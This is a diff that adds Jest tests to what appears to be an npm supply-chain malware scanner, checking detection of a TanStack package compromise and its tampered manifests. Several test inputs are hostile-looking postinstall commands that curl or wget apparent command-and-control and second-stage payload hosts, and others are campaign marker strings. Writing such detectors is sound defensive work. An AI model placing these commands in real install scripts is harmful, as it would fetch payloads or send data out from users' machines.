@@ -1,7 +1,7 @@
 import * as fs from 'fs';
 import * as path from 'path';
 import * as crypto from 'crypto';
-import { analyzeScripts, scanProject } from '../src/index';
+import { analyzeScripts, analyzeManifest, scanProject } from '../src/index';
 
 const TEST_DIR = path.join(__dirname, 'temp_research_test');
 
@@ -339,6 +339,278 @@ describe('Axios Supply Chain Attack Detection (March 2026)', () => {
       const content = fs.readFileSync(csvPath, 'utf8');
       expect(content).toContain('@shadanai/openclaw');
       expect(content).toContain('@qqbrowser/openclaw-qbot,0.0.130');
+    });
+  });
+});
+
+describe('TanStack Wave 4 Detection (May 2026, GHSA-g7cv-rxg3-hmpx)', () => {
+  describe('Script Analysis - TanStack Patterns', () => {
+    test('should detect EveryBoiWeBuildIsAWormyBoi campaign identifier', () => {
+      const findings = analyzeScripts({
+        scripts: { prepare: 'echo "EveryBoiWeBuildIsAWormyBoi"' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner dead-mans-switch string', () => {
+      const findings = analyzeScripts({
+        scripts: { postinstall: '# IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect OhNoWhatsGoingOnWithGitHub token-recovery magic string', () => {
+      const findings = analyzeScripts({
+        scripts: { prepare: 'echo OhNoWhatsGoingOnWithGitHub' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect svksjrhjkcejg PBKDF2 salt', () => {
+      const findings = analyzeScripts({
+        scripts: { prepare: 'const salt="svksjrhjkcejg";' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect bun run tanstack_runner.js prepare hook', () => {
+      const findings = analyzeScripts({
+        scripts: { prepare: 'bun run tanstack_runner.js && exit 1' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect filev2.getsession.org C2 endpoint', () => {
+      const findings = analyzeScripts({
+        scripts: { postinstall: 'curl https://filev2.getsession.org/upload' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect api.masscan.cloud C2 domain', () => {
+      const findings = analyzeScripts({
+        scripts: { postinstall: 'curl api.masscan.cloud/beacon' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect git-tanstack.com impersonation domain', () => {
+      const findings = analyzeScripts({
+        scripts: { postinstall: 'curl git-tanstack.com/payload' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect litter.catbox.moe second-stage URL', () => {
+      const findings = analyzeScripts({
+        scripts: { postinstall: 'wget litter.catbox.moe/h8nc9u.js' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should detect dependabout/ branch impersonation pattern', () => {
+      const findings = analyzeScripts({
+        scripts: { prepare: 'git checkout dependabout/setup-formatter' },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: expect.stringContaining('Known Malware Signature Match'),
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+  });
+
+  describe('Manifest Analysis - TanStack Tampering', () => {
+    test('should flag known-bad commit hash 79ac49eedf in any dep section', () => {
+      const findings = analyzeManifest({
+        optionalDependencies: {
+          '@tanstack/setup': 'github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c',
+        },
+      });
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            ruleId: 'malicious-git-ref',
+            severity: 'critical',
+          }),
+        ]),
+      );
+    });
+
+    test('should flag truncated 79ac49eedf ref', () => {
+      const findings = analyzeManifest({
+        dependencies: {
+          'some-pkg': 'github:tanstack/router#79ac49eedf',
+        },
+      });
+      expect(findings.map((f) => f.ruleId)).toContain('malicious-git-ref');
+    });
+
+    test('should flag @tanstack/setup phantom dep in optionalDependencies', () => {
+      const findings = analyzeManifest({
+        optionalDependencies: {
+          '@tanstack/setup': 'github:tanstack/router#deadbeef00000000000000000000000000000000',
+        },
+      });
+      expect(findings.map((f) => f.ruleId)).toContain('tanstack-setup-phantom-dep');
+    });
+
+    test('should flag a generic commit-pinned optional git dep', () => {
+      const findings = analyzeManifest({
+        optionalDependencies: {
+          'something-evil': 'github:attacker/repo#abcdef1234567890abcdef1234567890abcdef12',
+        },
+      });
+      expect(findings.map((f) => f.ruleId)).toContain('commit-pinned-optional-dep');
+    });
+
+    test('should NOT flag a normal semver dependency', () => {
+      const findings = analyzeManifest({
+        dependencies: {
+          react: '^19.0.0',
+          axios: '~1.7.0',
+        },
+        optionalDependencies: {
+          fsevents: '^2.3.3',
+        },
+      });
+      expect(findings).toEqual([]);
+    });
+
+    test('should respect suppressedRules config', () => {
+      const findings = analyzeManifest(
+        {
+          optionalDependencies: {
+            '@tanstack/setup': 'github:tanstack/router#79ac49eedf',
+          },
+        },
+        { suppressedRules: ['malicious-git-ref', 'tanstack-setup-phantom-dep'] },
+      );
+      expect(findings).toEqual([]);
+    });
+  });
+
+  describe('Malware Filenames - TanStack', () => {
+    const TEST_DIR_TS = path.join(__dirname, 'temp_tanstack_test');
+    beforeAll(() => {
+      if (fs.existsSync(TEST_DIR_TS)) fs.rmSync(TEST_DIR_TS, { recursive: true, force: true });
+      fs.mkdirSync(TEST_DIR_TS);
+    });
+    afterAll(() => {
+      if (fs.existsSync(TEST_DIR_TS)) fs.rmSync(TEST_DIR_TS, { recursive: true, force: true });
+    });
+
+    test('should flag router_init.js dropped in the project root', async () => {
+      fs.writeFileSync(path.join(TEST_DIR_TS, 'router_init.js'), 'console.log("payload");');
+      fs.writeFileSync(
+        path.join(TEST_DIR_TS, 'package.json'),
+        JSON.stringify({ name: 'x', version: '1.0.0' }),
+      );
+      fs.writeFileSync(
+        path.join(TEST_DIR_TS, 'package-lock.json'),
+        JSON.stringify({ name: 'x', version: '1.0.0', lockfileVersion: 2, packages: {} }),
+      );
+
+      const result = await scanProject(TEST_DIR_TS, []);
+      expect(result.warnings.some((w) => w.includes('router_init.js'))).toBe(true);
+    });
+
+    test('should flag tanstack_runner.js dropped in the project root', async () => {
+      fs.writeFileSync(path.join(TEST_DIR_TS, 'tanstack_runner.js'), 'console.log("runner");');
+      const result = await scanProject(TEST_DIR_TS, []);
+      expect(result.warnings.some((w) => w.includes('tanstack_runner.js'))).toBe(true);
+    });
+  });
+
+  describe('Known Threats CSV - TanStack Packages', () => {
+    const csvPath = path.join(__dirname, '..', 'sources', 'known-threats.csv');
+    const content = fs.readFileSync(csvPath, 'utf8');
+
+    test('should include primary TanStack router packages', () => {
+      expect(content).toContain('@tanstack/react-router,1.169.5');
+      expect(content).toContain('@tanstack/react-router,1.169.8');
+      expect(content).toContain('@tanstack/vue-router,1.169.5');
+      expect(content).toContain('@tanstack/solid-router,1.169.8');
+      expect(content).toContain('@tanstack/router-core,1.169.5');
+    });
+
+    test('should include TanStack start packages', () => {
+      expect(content).toContain('@tanstack/react-start,1.167.68');
+      expect(content).toContain('@tanstack/react-start,1.167.71');
+      expect(content).toContain('@tanstack/router-plugin,1.167.38');
+      expect(content).toContain('@tanstack/router-plugin,1.167.41');
+    });
+
+    test('should include @mistralai/mistralai secondary victim', () => {
+      expect(content).toContain('@mistralai/mistralai,2.2.2');
+      expect(content).toContain('@mistralai/mistralai,2.2.3');
+      expect(content).toContain('@mistralai/mistralai,2.2.4');
     });
   });
 });
